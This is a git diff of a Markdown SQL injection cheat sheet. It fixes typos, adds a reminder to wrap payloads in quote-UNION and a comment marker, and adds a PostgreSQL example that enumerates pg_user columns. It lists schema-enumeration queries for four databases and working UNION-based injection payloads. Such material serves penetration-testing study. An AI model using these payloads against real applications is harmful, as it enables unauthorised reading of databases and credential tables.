@@ -159,11 +159,12 @@ Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 1439
 ## `*`
 > This Defines that you might have to add more columns in the code in order for code to work
 
+### ***Dont  forget to add `' UNION` at the beggining and `--` at the end***
 | Type | String |
 | --- | --- |
 | Oracle   | `SELECT table_name,* FROM all_tables` <br> `SELECT column_name,* FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
 | Microsoft |  `SELECT table_name,* FROM information_schema.tables` <br> `SELECT column_name,* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
-| PostgreSQL |  `SELECT table_name,* FROM information_schema.tables` <br> `SELECT ccolumn_name,* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| PostgreSQL |  `SELECT table_name,* FROM information_schema.tables` <br> `SELECT column_name,* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
 | MySQL |  `SELECT table_name,* FROM information_schema.tables` <br> `SELECT column_name,* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
 
  With `.tables` it returns output like the following: 
@@ -184,12 +185,18 @@ MyDatabase     dbo           Users       Username     varchar
 MyDatabase     dbo           Users       Password     varchar
 ```
 
-- Example of **PostgreSQL**printing tables. In the following coode server applies 2 columns. We replace one of those with **table_name**. 
+- Example of **PostgreSQL** printing tables. In the following code, server applies 2 columns. We replace one of those with **table_name**. 
 ```sql
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
  ```
 
 ![image](https://github.com/th3knv/SQL_injection_cheatsheet/assets/76121926/5112fb40-80ba-4281-badf-31ab4289f463)
+
+- Going deeper (**for PostgreSQL**) we can explore the content of the table. Searching up a bit we will use an interesting table schema called `pg_user`
+```sql
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'pg_user'--
+```
+![image](https://github.com/th3knv/SQL_injection_cheatsheet/assets/76121926/90ccbe5c-d806-4f31-b73f-c35de8f5a3d0)
 
 #
 
